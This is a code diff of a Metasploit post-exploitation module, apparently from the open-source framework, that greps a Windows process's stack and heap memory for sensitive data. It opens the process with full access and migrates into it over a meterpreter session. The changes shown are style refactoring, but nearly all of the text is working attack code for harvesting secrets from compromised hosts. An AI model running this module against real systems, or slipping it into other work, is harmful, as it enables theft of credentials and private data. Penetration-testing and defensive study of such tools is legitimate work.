@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,27 +7,25 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Process Memory Grep',
-      'Description'    => %q{
-          This module allows for searching the memory space of a proccess for potentially
-        sensitive data.  Please note: When the HEAP option is enabled, the module will have
-        to migrate to the process you are grepping, and will not migrate back automatically.
-        This means that if the user terminates the application after using this module, you
-        may lose your session.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['bannedit'],
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'           => 'Windows Gather Process Memory Grep',
+                      'Description'    => %q(
+                          This module allows for searching the memory space of a proccess for potentially
+                        sensitive data.  Please note: When the HEAP option is enabled, the module will have
+                        to migrate to the process you are grepping, and will not migrate back automatically.
+                        This means that if the user terminates the application after using this module, you
+                        may lose your session.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         => ['bannedit'],
+                      'Platform'       => ['win'],
+                      'SessionTypes'   => ['meterpreter' ]))
     register_options([
-      OptString.new('PROCESS', [true,  'Name of the process to dump memory from', nil]),
-      OptRegexp.new('REGEX',   [true,  'Regular expression to search for with in memory', nil]),
-      OptBool.new('HEAP',      [false, 'Grep from heap', false])
-    ], self.class)
+                       OptString.new('PROCESS', [true,  'Name of the process to dump memory from', nil]),
+                       OptRegexp.new('REGEX',   [true,  'Regular expression to search for with in memory', nil]),
+                       OptBool.new('HEAP',      [false, 'Grep from heap', false])
+                     ], self.class)
   end
 
   def get_data_from_stack(target_pid)
@@ -59,7 +58,7 @@ class MetasploitModule < Msf::Post
       print_status("Migrating into #{target_pid} to allow for dumping heap data")
       session.core.migrate(target_pid)
     end
-    proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
     railgun = session.railgun
     heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
@@ -81,19 +80,19 @@ class MetasploitModule < Msf::Post
     handles.each do |handle|
       lpentry = "\x00" * 42
       ret = ''
-      while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
+      while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) && ret['return']
         entry = ret['lpEntry'][0, 4].unpack('V')[0]
         pointer = proc.memory.read(entry, 512)
         size = ret['lpEntry'][4, 4].unpack('V')[0]
-        data = proc.memory.read(entry, (size == 0) ? 1048576 : size)
+        data = proc.memory.read(entry, size == 0 ? 1048576 : size)
         heap << {
           'Address' => entry,
           'Size' => data.length,
           'Handle' => handle,
           'Data' => data
-        } if data.length > 0
+        } unless data.empty?
         lpentry = ret['lpEntry']
-        break if ret['GetLastError'] == 259 or size == 0
+        break if (ret['GetLastError'] == 259) || (size == 0)
       end
     end
 
@@ -106,13 +105,12 @@ class MetasploitModule < Msf::Post
     get_data_from_stack(target_pid).each do |mem|
       idx = mem['Data'].index(regex)
 
-      if idx != nil
-        print_status("Match found on stack!")
-        print_line
-        data = mem['Data'][idx, 512]
-        addr = mem['Address'] + idx
-        print_line(Rex::Text.to_hex_dump(data, 16, addr))
-      end
+      next if idx.nil?
+      print_status("Match found on stack!")
+      print_line
+      data = mem['Data'][idx, 512]
+      addr = mem['Address'] + idx
+      print_line(Rex::Text.to_hex_dump(data, 16, addr))
     end
 
     # Grep from heap is optional.  If the 'HEAP' option isn't set,
@@ -122,13 +120,12 @@ class MetasploitModule < Msf::Post
     get_data_from_heap(target_pid).each do |mem|
       idx = mem['Data'].index(regex)
 
-      if idx != nil
-        print_status("Match found on heap!")
-        print_line
-        data = mem['Data'][idx, 512]
-        addr = mem['Address'] + idx
-        print_line(Rex::Text.to_hex_dump(data, 16, addr))
-      end
+      next if idx.nil?
+      print_status("Match found on heap!")
+      print_line
+      data = mem['Data'][idx, 512]
+      addr = mem['Address'] + idx
+      print_line(Rex::Text.to_hex_dump(data, 16, addr))
     end
   end
 
@@ -156,10 +153,9 @@ class MetasploitModule < Msf::Post
     print_status("PIDs found for #{proc_name}: #{pids * ', '}")
 
     pids.each do |pid|
-      print_status("Searching in process: #{pid.to_s}...")
+      print_status("Searching in process: #{pid}...")
       dump_data(pid)
       print_line
     end
-
   end
 end
